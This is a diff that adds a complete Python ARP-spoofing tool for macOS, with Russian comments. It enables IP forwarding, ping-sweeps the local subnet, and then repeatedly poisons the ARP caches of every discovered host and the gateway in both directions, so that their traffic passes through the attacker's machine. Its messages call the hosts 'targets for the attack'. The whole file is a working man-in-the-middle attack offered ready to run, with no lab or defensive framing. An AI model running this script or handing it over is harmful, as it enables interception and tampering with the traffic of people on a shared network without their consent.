@@ -1,0 +1,224 @@
+import argparse
+import multiprocessing
+import multiprocessing.dummy
+import os
+import socket
+import subprocess
+import sys
+import time
+from scapy.all import ARP, Ether, send, srp
+
+
+def diff(first, second):
+    second = set(second)
+    return [item for item in first if item not in second]
+
+
+def get_gateway():
+    """Получает IP-адрес шлюза (роутера) в macOS через команду netstat."""
+    try:
+        output = subprocess.check_output(
+            ["netstat", "-rn"], universal_newlines=True
+        )
+        for line in output.splitlines():
+            fields = line.split()
+            if len(fields) >= 2 and fields[0] == "default":
+                return fields[1]
+    except Exception as e:
+        print(f"[-] Ошибка при получении шлюза: {e}")
+        sys.exit(1)
+
+
+def get_masc():
+    """Формирует маску подсети (например, '192.168.1.')."""
+    gateway = get_gateway()
+    if not gateway:
+        print("[-] Не удалось определить IP шлюза.")
+        sys.exit(1)
+    self_ip = gateway.split(".")
+    return self_ip[0] + "." + self_ip[1] + "." + self_ip[2] + "."
+
+
+def enable_ip_route(verbose=True):
+    """Включает IP forwarding в macOS через sysctl."""
+    if verbose:
+        print("[!] Включение IP Forwarding (маршрутизации пакетов)...")
+    try:
+        current_status = (
+            subprocess.check_output(
+                ["sysctl", "-n", "net.inet.ip.forwarding"],
+                universal_newlines=True,
+            )
+            .strip()
+        )
+        if current_status == "1":
+            if verbose:
+                print("[!] IP Routing уже включен.")
+            return
+
+        subprocess.check_call(["sysctl", "-w", "net.inet.ip.forwarding=1"])
+        if verbose:
+            print("[+] IP Routing успешно включен.")
+    except subprocess.CalledProcessError:
+        print(
+            "[-] Не удалось включить IP forwarding. Вы запустили скрипт с sudo?"
+        )
+        sys.exit(1)
+
+
+def get_mac(ip):
+    """Возвращает MAC-адрес устройства через ARP-запрос."""
+    ans, _ = srp(
+        Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), timeout=3, verbose=0
+    )
+    if ans:
+        return ans[0][1].src
+    return None
+
+
+def get_self_ip():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+    except Exception:
+        ip = "127.0.0.1"
+    finally:
+        s.close()
+    return ip
+
+
+def ip4_addresses():
+    ips = []
+    masc = get_masc()
+    for i in range(1, 255):
+        ips.append(masc + str(i))
+
+    print("[*] Начало сканирования сети...")
+    # Получаем результаты с визуальным отображением
+    active_ips = ping_range(ips)
+    print(f"\n[+] Сканирование завершено. Найдено устройств: {len(active_ips)}")
+    return active_ips
+
+
+def spoof(target_ip, host_ip, verbose=True):
+    target_mac = get_mac(target_ip)
+    if not target_mac:
+        return
+
+    arp_response = ARP(
+        pdst=target_ip, hwdst=target_mac, psrc=host_ip, op="is-at"
+    )
+    send(arp_response, verbose=0)
+    if verbose:
+        self_mac = ARP().hwsrc
+        print(f"[+] Sent to {target_ip} : {host_ip} is-at {self_mac}")
+
+
+def restore(target_ip, host_ip, verbose=True):
+    target_mac = get_mac(target_ip)
+    host_mac = get_mac(host_ip)
+    if not target_mac or not host_mac:
+        return
+
+    arp_response = ARP(
+        pdst=target_ip,
+        hwdst=target_mac,
+        psrc=host_ip,
+        hwsrc=host_mac,
+        op="is-at",
+    )
+    send(arp_response, verbose=0, count=7)
+    if verbose:
+        print(f"[+] Восстановлено {target_ip} : {host_ip} is-at {host_mac}")
+
+
+def ping(ip):
+    """Проверяет хост на доступность."""
+    ret = os.system(f"ping -q -c 1 -t 1 {ip} > /dev/null 2>&1")
+    return ip if ret == 0 else None
+
+
+def ping_range(ips):
+    """Сканирует диапазон IP с динамическим выводом прогресса в консоль."""
+    num_threads = 2 * multiprocessing.cpu_count()
+    p = multiprocessing.dummy.Pool(num_threads)
+
+    results = []
+    total_ips = len(ips)
+
+    # Используем imap_unordered для обработки результатов по мере их поступления
+    for index, res in enumerate(p.imap_unordered(ping, ips), 1):
+        if res:
+            results.append(res)
+
+        # Вычисляем процент выполнения
+        percent = (index / total_ips) * 100
+
+        # \r возвращает каретку в начало строки, стирая предыдущий вывод
+        # ljust(50) гарантирует, что старый длинный текст перекроется новым
+        sys.stdout.write(
+            f"\r[*] Прогресс: [{index}/{total_ips}] {percent:.1f}% | Проверка: {ips[index-1 if index < total_ips else total_ips-1]}".ljust(
+                80
+            )
+        )
+        sys.stdout.flush()
+
+    p.close()
+    p.join()
+
+    return results
+
+
+def spoof_all(targets, host, verbose=False):
+    if not targets:
+        print("[-] Нет доступных целей для спуфинга.")
+        return
+
+    print(f"[*] Начинаем атаку на {len(targets)} устройств...")
+    try:
+        while True:
+            for target in targets:
+                if verbose:
+                    print(f"Спуфинг {target}")
+                spoof(target, host, verbose)
+                spoof(host, target, verbose)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\n[!] Остановка атаки. Восстановление сетевых настроек...")
+        for target in targets:
+            restore(target, host, verbose)
+            restore(host, target, verbose)
+        print("[+] Сеть восстановлена. Выход.")
+
+
+if __name__ == "__main__":
+    if os.geteuid() != 0:
+        print(
+            "[-] Этот скрипт ДОЛЖЕН быть запущен с правами суперпользователя (sudo)."
+        )
+        sys.exit(1)
+
+    parser = argparse.ArgumentParser(description="ARP spoof script for macOS")
+    parser.add_argument(
+        "-v",
+        "--verbose",
+        action="store_true",
+        help="Подробный вывод отправки пакетов",
+    )
+    args = parser.parse_args()
+    verbose = args.verbose
+
+    enable_ip_route(verbose)
+
+    host = get_gateway()
+    self_ip = get_self_ip()
+    exclude = [self_ip, host]
+
+    print(f"[+] Ваш IP: {self_ip}")
+    print(f"[+] IP Шлюза: {host}")
+
+    targets = diff(ip4_addresses(), exclude)
+    print(f"[+] Финальный список целей для атаки: {targets}")
+
+    spoof_all(targets, host, verbose)
